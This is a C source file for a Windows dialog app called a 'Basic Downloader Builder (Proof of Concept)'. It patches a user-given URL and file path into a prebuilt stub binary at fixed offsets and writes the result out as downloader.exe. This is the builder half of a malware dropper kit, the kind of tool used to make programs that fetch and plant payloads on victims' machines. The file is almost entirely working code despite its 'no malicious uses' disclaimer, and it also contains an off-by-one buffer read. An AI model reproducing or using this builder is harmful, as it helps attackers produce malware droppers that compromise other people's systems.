/*
	MSVC
	Basic Downloader Builder (Proof of Concept)
	by YANiS

	This code snippet is provided 'as is' without warranty of any kind.
	No malicious uses are allowed.
*/

#include <windows.h>
#include "resource.h"

BOOL CALLBACK DlgProc(HWND hwnd, UINT uMsg, WPARAM wParam,LPARAM lParam) {

    unsigned char url[50] = {0};
    unsigned char path[50] = {0};

    switch (uMsg) {
    case WM_CLOSE:
        EndDialog(hwnd, 0);
        break;

    case WM_INITDIALOG:
        SetWindowTextA(hwnd, "Basic Downloader Builder (Proof of Concept)");
        SendDlgItemMessageA(hwnd, IDC_URL, EM_LIMITTEXT, 50, 0);
        SendDlgItemMessageA(hwnd, IDC_PATH, EM_LIMITTEXT, 50, 0);
        SetFocus(GetDlgItem(hwnd, IDC_URL));
        return FALSE;

    case WM_COMMAND:
        switch(LOWORD(wParam)) {

        case IDB_BUILD:

            if((GetDlgItemTextA(hwnd, IDC_URL, (LPSTR)url, 50+1) < 5) || (GetDlgItemTextA(hwnd, IDC_PATH, (LPSTR)path, 50+1) < 5) ) {
                SetWindowTextA(GetDlgItem(hwnd, IDC_STATUS), "Status: URL or PATH error!");
                return 1;
            }

            unsigned char *lpBuffer = NULL;
            size_t fileSize = 0;

            HANDLE hFile = CreateFileA("stub.bin",
                                       GENERIC_READ,
                                       FILE_SHARE_READ,
                                       NULL,
                                       OPEN_EXISTING,
                                       FILE_ATTRIBUTE_NORMAL,
                                       NULL);

            if (hFile == INVALID_HANDLE_VALUE) {
                SetWindowTextA(GetDlgItem(hwnd, IDC_STATUS), "Status: CreateFile error!");
                return 1;
            }

            fileSize = GetFileSize(hFile, 0);
            if (fileSize == 0) {
                SetWindowTextA(GetDlgItem(hwnd, IDC_STATUS), "Status: GetFileSize error!");

                CloseHandle(hFile);
                return 1;
            }

            lpBuffer = (unsigned char *)VirtualAlloc(NULL,
                       fileSize,
                       MEM_COMMIT,
                       PAGE_READWRITE);

            if (lpBuffer == NULL) {
                SetWindowTextA(GetDlgItem(hwnd, IDC_STATUS), "Status: VirtualAlloc error!");
                CloseHandle(hFile);
                return 1;
            }

            DWORD bytesRead;
            if (!ReadFile(hFile,
                          lpBuffer,
                          fileSize,
                          &bytesRead,
                          NULL) || bytesRead != fileSize) {

                SetWindowTextA(GetDlgItem(hwnd, IDC_STATUS), "Status: ReadFile error!");
                return 1;
            }
            CloseHandle(hFile);
            strcpy((char*)(lpBuffer + 0x218), (char*)url);
            strcpy((char*)(lpBuffer + 0x24C), (char*)path);

            hFile = CreateFileA("downloader.exe",
                                GENERIC_WRITE,
                                0,
                                NULL,
                                CREATE_ALWAYS,
                                FILE_ATTRIBUTE_NORMAL,
                                NULL);

            if (hFile == INVALID_HANDLE_VALUE) {
                SetWindowTextA(GetDlgItem(hwnd, IDC_STATUS), "Status: WriteFile error!");
                return 1;
            }

            DWORD bytesWritten;
            WriteFile(hFile,
                      lpBuffer,
                      fileSize,
                      &bytesWritten,
                      NULL);

            CloseHandle(hFile);

            SetWindowTextA(GetDlgItem(hwnd, IDC_STATUS), "Status: FINISHED");
            break;
        }
    default:
        return FALSE;
    }
    return TRUE;
}

int main() {
    DialogBoxParamA(GetModuleHandleA(NULL),
                    MAKEINTRESOURCE(IDD_BUILDER),
                    NULL,
                    DlgProc,
                    (LPARAM)NULL);
    return 0;
}
